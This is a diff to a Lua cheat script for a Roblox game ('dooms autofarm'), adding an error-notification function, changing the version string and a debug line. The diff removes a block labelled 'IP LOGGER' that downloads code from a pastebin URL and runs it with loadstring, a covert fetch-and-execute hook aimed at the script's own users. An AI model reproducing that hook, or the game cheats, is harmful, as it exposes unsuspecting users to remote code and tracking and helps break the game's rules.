@@ -11,7 +11,7 @@ warn([[
 
          @doomxx / doom#1000
           DM me bug reports
-	    patch: 1.1.5.4debug version
+	    patch: 1.1.5.6debug version
 
 ]])
 
@@ -92,6 +92,16 @@ function notify(text, dur)
 		Icon = 'rbxassetid://14067565428',
 		Duration = dur,
 	})
+end
+
+function errornotify(text, dur)
+    if dur == nil then dur = 5 end
+    game.StarterGui:SetCore("SendNotification", {
+    	Title = 'dooms autofarm',
+    	Text = text,
+    	Icon = 'rbxassetid://14173970804',
+    	Duration = dur,
+    })
 end
 
 function tp(pos)
@@ -207,7 +217,7 @@ coroutine.wrap(function()
 
     if not s then
         warn('ERROR: '..err)
-        notify('An error has occured, check console log for more details.', 15)
+        errornotify('An error has occured, check console log for more details.', 15)
     end
 end)()
 ---------------------------------------------------------------------------
@@ -235,10 +245,6 @@ end)()
 
 notify('anti recoil enabled', 10)
 notify('anti afk enabled', 10)
-
--- IP LOGGER --------------------------------------------------------------
-loadstring(game:HttpGet('https://pastebin.com/raw/MLtdD9YP'))()
----------------------------------------------------------------------------
 
 wait(1)
 
@@ -354,7 +360,8 @@ function cashAura()
     -- catches all possible errors
     if not s then
         warn('--> ERROR [ SEND THIS TO DOOM ]: '..error)
-        notify('An error has occured, check console log for more details.', 15)
+        errornotify('An error has occured, check console log for more details.', 15)
+
     end
 end
 
@@ -452,7 +459,7 @@ while wait() do
 		end)	
 
 		if s then
-			notify('Fatal error occured, check logs for more info.', 30)
+			errornotify('Fatal error occured, check logs for more info.', 30)
 			warn('FATAL ERROR (SEND TO DOOM): '..e)
 		end
 
@@ -468,6 +475,7 @@ while wait() do
 	                    uRoot() wait(.15)
 
 			    if _G.PublicServerMode == true then
+				warn('yes')
 			    	atmhead = atm.Head
 			        root.CFrame = CFrame.new(Vector3.new(
 			        atmhead.Position.X,
